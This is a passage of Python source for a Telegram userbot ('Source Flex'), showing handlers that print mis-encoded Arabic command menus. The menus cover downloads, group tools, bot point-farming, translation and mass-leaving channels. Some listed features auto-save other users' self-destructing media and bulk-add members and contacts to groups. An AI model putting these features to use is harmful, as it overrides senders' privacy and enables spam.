‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸäŸÇÿßŸÅ ÿ≥ÿ±ŸÇŸá ÿßŸÑÿ¥ÿ≠ÿµ ŸÖŸÜ ÿ®Ÿàÿ™ ŸàÿπÿØ

```‚ñ™Ô∏é ŸÖŸÑÿßÿ≠ÿ∏ÿ© ÿßŸÑÿßŸàÿßŸÖÿ± ÿ™ŸÜÿ∑ÿ®ŸÇ ÿπŸÑŸâ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑŸÖÿ¥ÿßÿ®ŸáŸá ŸÑÿ®Ÿàÿ™ ŸàÿπÿØ```
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m6_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ7'))
async def show_m7_commands(event):
    m7_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿ™ÿ≠ŸÖŸäŸÑ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ŸäŸàÿ™ŸäŸàÿ® (ÿπŸÜŸàÿßŸÜ ÿßŸÑŸÅŸäÿØŸäŸà)`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ≠ŸÖŸäŸÑ ŸÖŸÜ ŸäŸàÿ™ŸäŸàÿ® 

 ‚Ä¢ `.ÿ™ÿ≠ŸÖŸäŸÑ + ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™ ŸÖŸÜ ÿ¨ŸÖŸäÿπ ÿßŸÑÿ™ŸàÿßÿµŸÑ ÿßŸÑÿßÿ¨ÿ™ŸÖÿßÿπŸä  ( ŸÇÿ±ŸäŸäÿ®ÿß) 

‚Ä¢ `.ŸäŸàÿ™ + ÿßÿ≥ŸÖ ÿßŸÑÿßÿ∫ŸÜŸäŸá`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ŸÑ ÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑÿ£ÿ∫ŸÜŸäÿ© Ÿàÿ£ÿ±ÿ≥ŸÑŸáÿß 

ŸÖŸÑÿßÿ≠ÿ∏ÿ© ŸÖŸáŸÖÿ©  !!  ÿπŸÜÿØ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ ÿßŸÖÿ±  (.ŸäŸàÿ™ŸäŸàÿ®) ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà ÿßŸÑÿ∞Ÿä ÿ™ŸÖ ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜŸá ŸÖÿπ ÿßŸÖÿ±  (.ŸäŸàÿ™) ŸÑÿ™ŸÜÿ≤ŸäŸÑ ÿßŸÑŸÅŸäÿØŸäŸà

‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m7_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ8'))
async def show_m8_commands(event):
    m8_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑŸÖÿ¨ŸÖŸàÿπŸá [‚òÖ]‚îÅ‚îÅ‚îÅ>

 ‚Ä¢ `.ÿ™ŸÇŸäŸäÿØ | ÿ®ÿßŸÑÿ±ÿØ`
‚ñ™ Ô∏éŸäŸÇŸàŸÖ ÿ®ÿ™ŸÇŸäÿØ ÿßŸÑÿ¥ÿÆÿµ ŸÖŸÜ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©

 ‚Ä¢ `.ÿßŸÑÿ∫ÿßÿ° ÿ™ŸÇŸäŸäÿØ | ÿ®ÿßŸÑÿ±ÿØ`
‚ñ™ Ô∏éŸäŸÇŸàŸÖ ÿ®ŸÅŸÉ ÿßŸÑÿ™ŸÇŸäÿØ ŸÖŸÜ ÿßŸÑÿ¥ÿÆÿµ 

 ‚Ä¢ `.ÿßŸÑŸÖŸÇŸäÿØŸäŸÜ`
 ‚ñ™ Ô∏é Ÿäÿπÿ±ÿ∂ ŸÑŸÉ ÿπÿØÿØ ÿßŸÑÿ£ÿ¥ÿÆÿßÿµ ÿßŸÑŸÖŸÇŸäÿØŸäŸÜ 
 
 ‚Ä¢ `.ŸÉÿ¥ŸÅ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©`
‚ñ™ Ô∏é Ÿäÿπÿ±ÿ∂ ŸÑŸÉ ŸÖÿπŸÑŸàŸÖÿßÿ™ ÿπŸÜ ÿßŸÑŸÉÿ±Ÿàÿ®

 ‚Ä¢ `.ÿ™ŸÅÿπŸäŸÑ ŸáŸÜÿß`
‚ñ™ Ô∏éŸÇŸÖ ÿ®ÿ±ÿØ ŸÅŸä ÿØÿßÿÆŸÑ ÿßŸÑŸÉÿ±Ÿàÿ® ŸÑŸÉŸä Ÿäÿ™ŸÖ ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ±ÿØŸàÿØ ŸÅŸä ÿßŸÑŸÉÿ±Ÿàÿ® 

 ‚Ä¢ `.ÿ™ÿπÿ∑ŸäŸÑ ŸáŸÜÿß`
‚ñ™ Ô∏éÿßÿ∞ÿß ŸÇŸÖÿ™ ÿ®ŸÑ ÿßŸÑÿßÿ±ÿ≥ÿßŸÑ ŸÅŸä ÿØÿßÿÆŸÑ ÿßŸÑŸÉÿ±Ÿàÿ® ÿ™ŸÅÿπŸäŸÑ ŸáŸÜÿß ŸäŸÖŸÉŸÜŸÉ ÿ™ÿπÿ∑ŸäŸÑŸáÿß ÿßÿ∞ÿß ŸÑŸÖ ÿ™ŸÅÿπŸÑ ŸÇŸÑÿß ÿ™ŸÉÿ™ÿ® ÿ¥Ÿä 

 ‚Ä¢ `.ÿßÿ∂ŸÅ ÿ±ÿØ`
‚ñ™ Ô∏éŸÖÿ´ÿßŸÑ ÿßÿ∂ŸÅ ÿ±ÿØ + ÿßŸÑÿ≥ŸÑÿßŸÖ ÿπŸÑŸäŸÉŸÖ + ŸàÿπŸÑŸäŸÉŸÖ ÿßŸÑÿ≥ŸÑÿßŸÖ ÿπŸÜÿØŸÖÿß ÿ¥ÿÆÿµ ŸäŸÉÿ™ÿ® ÿßŸÑÿ≥ŸÑÿßŸÖ ÿπŸÑŸäŸÉŸÖ Ÿäÿ±ÿØ ÿ®ÿπŸÑŸäŸÉŸÖ ÿßŸÑÿ≥ŸÑÿßŸÖ 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m8_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ9'))
async def show_m9_commands(event):
    m9_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖŸÑŸäÿßÿ±`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿ¨ŸàŸÉÿ±`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿßÿ®`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπŸÇÿ±ÿ®`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßŸÑÿπÿ±ÿ®`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿØÿπŸÖŸÉŸÖ`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ŸÉÿ±ÿ≥ÿ™ŸäÿßŸÜŸà`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ŸÖŸáÿØŸàŸäŸàŸÜ`
‚Ä¢ `.ÿ™ÿ¨ŸÖŸäÿπ ÿßÿ≥ÿßÿ≥ŸäŸÑ`

‚Ä¢ .ÿßŸäŸÇÿßŸÅ ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ  - ŸÑÿßŸäŸÇÿßŸÅ ÿ≠ÿßŸÑÿ© ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ 
```ŸÖŸÄŸÑÿßÿ≠ÿ∏ÿ© : Ÿäÿ¨ÿ® ÿßŸÑÿßÿ¥ÿ™ÿ±ÿßŸÉ ŸÅŸä ŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ®Ÿàÿ™ ÿßŸÑÿßÿ¨ÿ®ÿßÿ±Ÿäÿ© ŸÇÿ®ŸÑ ÿ®ÿØÿ° ÿßŸÑÿ™ÿ¨ŸÖŸäÿπ . ```
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m9_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ10'))
async def show_m10_commands(event):
    m10_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿÆÿ∑Ÿàÿ∑ [‚òÖ]‚îÅ‚îÅ‚îÅ>
‚éô `ÿÆÿ∑ ÿßŸÑÿ∫ÿßŸÖŸÇ`   ‚éô `ÿÆÿ∑ ŸÖÿ¥ÿ∑Ÿàÿ®`

‚éô `ÿÆÿ∑ ÿ±ŸÖÿ≤`   ‚éô `ÿÆÿ∑ ÿ®ÿßŸäÿ´ŸàŸÜ`

5- `.ÿ∑ÿ®ÿßÿπÿ©` + ÿßŸÑŸÉŸÑŸÖÿ© ÿßŸà ÿßŸÑÿ¨ŸÖŸÑÿ© ÿßŸÑŸÖÿ±ÿßÿØ ÿßÿ±ÿ≥ÿßŸÑŸáÿß

ÿ¨ŸÖŸäÿπ ÿßŸÑÿÆÿ∑Ÿàÿ∑ ÿßÿπŸÑÿßŸá ÿ™ÿ™ŸàŸÇŸÅ ÿ®ŸÉÿ™ÿßÿ®ÿ© ŸÜŸÅÿ≥ ÿßŸÖÿ± ÿßŸÑÿ™ÿ¥ÿ∫ŸäŸÑ 

 ‚Ä¢ Ô∏é`.ŸÖÿ™ÿ±ÿ¨ŸÖ` + ÿ±ŸÖÿ≤ ÿßŸÑŸÑÿ∫ÿ© | ŸÖÿ´ÿßŸÑ .ŸÖÿ™ÿ±ÿ¨ŸÖ ar

‚ñ™Ô∏é ŸäŸÇŸàŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± ÿ®ÿπÿØ ÿ™ŸÅÿπŸäŸÑŸá ÿ®ÿ™ÿ≠ŸàŸäŸÑ ÿßŸä ÿ¨ŸÖŸÑŸá ÿßŸÑŸâ ÿßŸÑŸÑÿ∫ÿ© ÿßŸÑŸÖÿ≠ÿØÿØŸá

‚ñ™ Ô∏é`.ÿßŸäŸÇÿßŸÅ ÿßŸÑŸÖÿ™ÿ±ÿ¨ŸÖ` ŸÑÿßŸäŸÇÿßŸÅ ÿßŸÑÿÆÿØŸÖÿ©
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m10_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ11'))
async def show_m11_commands(event):
    m11_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ŸÜÿµŸäÿ® [‚òÖ]‚îÅ‚îÅ‚îÅ>

ŸÖÿ™ŸàŸÇŸÅŸá ŸÅŸä Ÿáÿ∞ÿß ÿßŸÑÿ™ÿ≠ÿØŸäÿ´ 

"""
    await event.edit(m11_text)


@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ12'))
async def show_m12_commands(event):
    m12_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑŸÖÿ∫ÿßÿØÿ±ÿ© [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™'`
‚ñ™Ô∏é ŸÑŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿ™ŸÖÿ™ŸÑŸÉŸáÿß ÿ®ÿßÿ≥ÿ™ÿ´ŸÜÿßÿ° ÿßŸÑŸÇŸÜŸàÿßÿ™ ÿßŸÑÿ™Ÿä ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸáÿß ÿßŸà ŸÖÿ¥ÿ±ŸÅ ŸÅŸäŸáÿß 

 ‚Ä¢ `.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™`
‚ñ™Ô∏é ŸÑŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿ®ÿßÿ≥ÿ™ÿ´ŸÜÿßÿ° ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑÿ™Ÿä ÿßŸÜÿ™ ŸÖÿßŸÑŸÉŸáÿß ÿßŸà ŸÖÿ¥ÿ±ŸÅ ŸÅŸäŸáÿß 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m12_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ13'))
async def show_m13_commands(event):
    m13_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ∞ÿßÿ™ŸäŸá [‚òÖ]‚îÅ‚îÅ‚îÅ>
      `.ÿ∞ÿßÿ™Ÿäÿ©`
‚ñ™Ô∏é Ÿäÿ≥ÿ™ÿÆÿØŸÖ ŸÑÿ≠ŸÅÿ∏ ÿßŸÑÿµŸàÿ± ŸàÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™ ÿßŸÑŸÖÿ§ŸÇÿ™ÿ© (ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿµŸàÿ±ÿ©).

      `.ÿ≠ŸÅÿ∏ ÿßŸÑÿ∞ÿßÿ™Ÿäÿ©`
‚ñ™Ô∏é ÿ≥ŸäŸÇŸàŸÖ Ÿáÿ∞ÿß ÿßŸÑÿßŸÖÿ± ÿ®ÿπÿØ ÿ™ŸÅÿπŸäŸÑÿ© ÿ®ÿ≠ŸÅÿ∏ ÿßŸÑÿµŸàÿ± ŸàÿßŸÑŸÅŸäÿØŸäŸàŸáÿßÿ™ ÿßŸÑŸÖÿ§ŸÇÿ™Ÿá ÿ™ŸÑŸÇÿßÿ¶Ÿäÿß .
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m13_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ14'))
async def show_m14_commands(event):
    m14_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿßÿ∏ÿßŸÅÿ© [‚òÖ]‚îÅ‚îÅ‚îÅ>
        `.ÿ∂ŸäŸÅ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∂ÿßŸÅŸá ÿßŸÑÿßÿπÿ∂ÿßÿ° ÿßŸÑŸä ŸÉÿ±Ÿàÿ®ŸÉ ÿßŸà ŸÇŸÜÿßÿ™ŸÉ 

        `ÿßÿ∂ÿßŸÅÿ©_ÿ¨Ÿáÿßÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∂ÿßŸÅÿ© ÿ¨Ÿáÿßÿ™ ÿßŸÑÿßÿ™ÿµÿßŸÑ ÿßŸÑÿÆÿßÿµŸá ÿ®ŸÉ Ÿàÿ®ÿ≥ÿ±ÿπŸá ŸÅÿßŸäŸÇŸá

``` ÿ™ŸÜÿ®ŸäŸá ŸÑÿß ÿ™ŸÑÿ≠ ÿ®ŸÑ ÿßŸÑÿßŸÖÿ± ŸÉÿ´ÿ± ÿ±ÿßÿ≠ ÿ™ŸÜÿ≠ÿ∏ÿ± ```
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m14_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ15'))
async def show_m15_commands(event):
    m15_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ™ÿ≠ŸàŸäŸÑ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ÿ≠ŸàŸäŸÑ ŸÜÿµ `
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ≠ŸàŸäŸÑ ÿßŸÑŸÜÿµ ÿßŸÑŸä ŸÖŸÑÿµŸÇ

 ‚Ä¢ `.ÿ≠ŸàŸÑ ŸÑŸÖŸÑÿµŸÇ`
‚ñ™Ô∏é Ÿäÿ≠ŸàŸÑ ÿßŸÑÿµŸàÿ±Ÿá ÿßŸÑŸâ ŸÖŸÑÿµŸÇ ŸÖÿ´ÿßŸÑ = .ÿ≠ŸàŸÑ ŸÑŸÖŸÑÿµŸÇ ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿµŸàÿ±ÿ©

 ‚Ä¢ `.ÿ≠ŸàŸÑ ŸÑÿµŸàÿ±Ÿá`
‚ñ™Ô∏é Ÿäÿ≠ŸàŸÑ ÿßŸÑŸÖŸÑÿµŸÇ ÿßŸÑŸâ ÿµŸàÿ±ÿ© ŸÖÿ´ÿßŸÑ = .ÿ≠ŸàŸÑ ŸÑÿµŸàÿ±Ÿá ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑŸÖŸÑÿµŸÇ 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m15_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ16'))
async def show_m16_commands(event):
    m16_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿ£ÿÆÿ±Ÿâ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ™ÿßÿ±ŸäÿÆŸá` ÿßŸà `ÿ™ÿßÿ±ŸäÿÆÿ©`
‚ñ™Ô∏é Ÿäÿ∏Ÿáÿ± ŸÑŸÉ ÿ™ÿßÿ±ŸäÿÆ ÿ£ŸÜÿ¥ÿ£ÿ° ÿßŸÑÿ≠ÿ≥ÿßÿ®

 ‚Ä¢ `.ÿßŸäŸÖŸäŸÑ ŸàŸáŸÖŸä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿπŸÖŸÑ ÿßŸäŸÖŸäŸÑ ŸàŸáŸÖŸä (ŸÖŸàŸÇÿ™)

 ‚Ä¢Ô∏é `.ÿ≠ÿßŸÑÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∏Ÿáÿßÿ± ÿßŸÜ ŸÉŸÜÿ™ ŸÖÿ≠ÿ∏Ÿàÿ± ÿßŸÖ ŸÑÿß 

 ‚Ä¢Ô∏é `.ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ±`
‚ñ™Ô∏é ŸÖÿ´ÿßŸÑ ÿßŸÉÿ™ÿ® ÿßŸÑÿ™ŸÉÿ®ÿ± : ÿßŸÑÿπÿØÿØ

 ‚Ä¢Ô∏é `.ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± 

 ‚Ä¢Ô∏é `.ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± 

 ‚Ä¢ `.ÿßÿÆÿ™ÿµÿßÿ±
‚ñ™Ô∏é Ÿäÿ≥ÿ™ÿÆÿØŸÖ ÿ®ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸä ÿ±ÿ≥ÿßŸÑÿ© ŸäŸÇŸàŸÖ ÿ®Ÿàÿ∂ÿπ ÿßÿÆÿ™ÿµÿßÿ± ŸÑŸÑÿ¨ŸÖŸÑÿ© ÿßŸÑÿ™Ÿä ÿ±ÿØÿØÿ™ ÿπŸÑŸäŸáÿß ÿ®ÿßŸÑÿßŸÖÿ± ŸÖÿ´ÿßŸÑ ÿßÿÆÿ™ÿµÿßÿ± + 1 ÿ®ÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©.

 ‚Ä¢Ô∏é `.ÿßŸÑÿßÿÆÿ™ÿµÿßÿ±ÿßÿ™`
‚ñ™Ô∏é Ÿäÿπÿ±ÿ∂ ŸÑŸÉ ÿßŸÑÿßÿÆÿ™ÿµÿßÿ±ÿßÿ™ ÿßŸÑŸÖÿ∂ÿßŸÅŸá 

 ‚Ä¢Ô∏é `.ÿ≠ÿ∞ŸÅ ÿßÿÆÿ™ÿµÿßÿ±`
‚ñ™Ô∏é Ÿäÿ≠ÿ∞ŸÅ ÿßŸÑÿßÿÆÿ™ÿµÿßÿ± ŸÖÿ´ÿßŸÑ = ÿ≠ÿ∞ŸÅ + ÿßŸÑŸÉŸÑŸÖŸá 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m16_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ17'))
async def show_m17_commands(event):
    m17_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä [‚òÖ]‚îÅ‚îÅ‚îÅ>
		`.ÿ∞ŸÉÿßÿ°`
‚ñ™Ô∏é ŸÖÿ´ÿßŸÑ ÿßŸÉÿ™ÿ® .ÿ∞ŸÉÿßÿ° : ÿßŸÑÿ≥ÿ§ÿßŸÑ

		`.ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ŸÅÿπŸäŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ™ÿ¥ÿ∫ŸäŸÑ ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä ŸÅŸä ÿ≠ÿ≥ÿßÿ®ŸÉ 

		`.ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ÿπÿ∑ŸäŸÑ`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ŸäŸÇÿßŸÅ ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä ŸÅŸä ÿßŸÑÿ≠ÿ≥ÿßÿ® 
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""    
    await event.edit(m17_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ18'))
async def show_m18_commands(event):
    m18_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑŸÇŸÜŸàÿßÿ™ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢Ô∏é `.ŸÇÿßÿ¶ŸÖŸá ŸÇŸÜŸàÿßÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®Ÿä ÿßÿ∏Ÿáÿßÿ± ÿ¨ŸÖŸäÿπ ŸÇŸÜŸàÿßÿ™ŸÉ 

 ‚Ä¢Ô∏é `.ŸÇÿßÿ¶ŸÖŸá ŸÉÿ±Ÿàÿ®ÿßÿ™Ÿä`
‚ñ™Ô∏é ŸäŸÇŸàŸÖ ÿ®ÿ•ÿ∏Ÿáÿßÿ± ÿ¨ŸÖŸäÿπ ŸÉÿ±Ÿàÿ®ÿßÿ™ŸÉ
‚ãÜ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÄ‚îÑ‚îÑ‚ãÜ
·Øì[ùêíùêéùêîùêëùêÇùêÑ ùêÖùë≥ùêÑùêó-ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥](https://t.me/source_flex) ·Øì
"""
    await event.edit(m18_text)

@client.on(events.NewMessage(from_users='me', pattern='.ŸÖ19'))
async def show_m19_commands(event):
    m19_text = """
<‚îÅ‚îÅ‚îÅ[‚òÖ] ÿßŸàÿßŸÖÿ± ÿßŸÑÿ≤ÿÆÿ±ŸÅ [‚òÖ]‚îÅ‚îÅ‚îÅ>
 ‚Ä¢ `.ÿ¥ÿ®ÿßÿ®1`
‚ñ™Ô∏é ÿ®ÿπÿ∑ŸäŸÉ ÿ≤ÿÆÿßÿ±ŸÅ ÿ¥ÿ®ÿßÿ® 1

